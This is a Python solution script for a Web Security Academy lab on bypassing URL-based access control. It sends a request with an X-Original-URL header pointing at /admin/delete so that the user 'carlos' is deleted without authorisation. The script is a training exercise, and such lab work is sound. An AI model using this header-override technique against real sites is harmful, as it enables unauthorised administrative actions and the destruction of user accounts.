############################################################
#
# Lab: URL-based access control can be circumvented
#
# Hack Steps: 
#      1. Add the X-Original-URL header to the request
#      2. Delete carlos from the admin panel
#
############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a3100b80372324481dc2f3300b10031.web-security-academy.net"

def main():  
    print(Fore.WHITE + "❯❯ Deleting carlos with X-Original-URL header in the request.. ", end="", flush=True)
    
    headers = { "X-Original-Url": "/admin/delete" }
    fetch("?username=carlos", headers=headers)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
        

def fetch(path, headers):
    try:  
        return requests.get(f"{LAB_URL}{path}", headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()


